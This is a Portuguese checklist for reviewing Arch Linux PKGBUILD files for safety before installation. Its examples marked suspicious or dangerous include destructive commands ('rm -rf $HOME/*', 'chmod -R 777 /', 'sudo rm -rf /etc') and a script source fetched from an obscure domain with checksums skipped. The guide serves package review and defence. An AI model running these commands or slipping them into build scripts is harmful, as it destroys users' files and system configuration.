# 🧩 Guia de Verificação de PKGBUILD

> Use este checklist para garantir que um PKGBUILD é seguro antes de instalar.

---

## 📝 1. Conferir a seção `source`

**Objetivo:** Garantir que os arquivos vêm de fontes confiáveis.

✅ Exemplo correto:
```bash
source=("https://github.com/exemplo/projeto/releases/download/v1.0/projeto-1.0.tar.gz")
sha256sums=("d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2")
```

⚠️ Exemplo suspeito:
```bash
source=("http://meusitealeatorio.xyz/malicioso.sh")
sha256sums=("SKIP")
```

**Checklist:**
- [ ] URLs confiáveis (site oficial, GitHub/GitLab do autor)
- [ ] `sha256sums` ou `sha512sums` válidos
- [ ] Nada vindo de domínios obscuros/desconhecidos

---

## 🕵️ 2. Analisar os arquivos incluídos

**Objetivo:** Garantir que não há scripts perigosos.

⚠️ Exemplo perigoso:
```bash
prepare() {
  rm -rf $HOME/*
  chmod -R 777 /
}
```

✅ Exemplo seguro:
```bash
prepare() {
  cd "$srcdir/$pkgname-$pkgver"
  patch -p1 < "$srcdir/fix-bug.patch"
}
```

**Checklist:**
- [ ] Nenhum `rm`, `chmod`, `chown`, `mv` fora de `$srcdir` ou `$pkgdir`
- [ ] Scripts não alteram `/`, `/home`, `/etc`, `/root`, etc.

---

## ⚙️ 3. Verificar `build()` e `package()`

**Objetivo:** Certificar que só compilam e empacotam o software.

✅ Exemplo correto:
```bash
build() {
  cd "$srcdir/$pkgname-$pkgver"
  make
}

package() {
  cd "$srcdir/$pkgname-$pkgver"
  make DESTDIR="$pkgdir/" install
}
```

⚠️ Exemplo suspeito:
```bash
build() {
  sudo rm -rf /etc
  make
}
```

**Checklist:**
- [ ] Apenas operações de build/instalação local
- [ ] Sem comandos destrutivos ou acesso a pastas do sistema

---

## 🛡️ 4. Verificar privilégios

**Regra de ouro:** Nenhum PKGBUILD deve usar `sudo` ou exigir root durante a compilação.

**Checklist:**
- [ ] Sem `sudo`, `su`, `chown root:root` ou acesso a `/root`
- [ ] Não modifica arquivos fora de `$pkgdir`

---

## 🧪 5. Testar com ferramentas

**Comandos úteis:**
```bash
namcap PKGBUILD
namcap pacote.pkg.tar.zst
makepkg --cleanbuild --syncdeps --rmdeps
```

**Checklist:**
- [ ] `namcap` não apontou problemas graves
- [ ] Build feito com `makepkg --cleanbuild`

---

## ✅ Checklist final

- [ ] `source` confiável e com `sha256sums`/`sha512sums`
- [ ] Scripts não contêm comandos perigosos
- [ ] `build()` e `package()` seguros
- [ ] Sem `sudo`/root
- [ ] Testado com `namcap` e `makepkg --cleanbuild`

---

> 📝 Dica: copie este arquivo como modelo para cada pacote que for revisar.
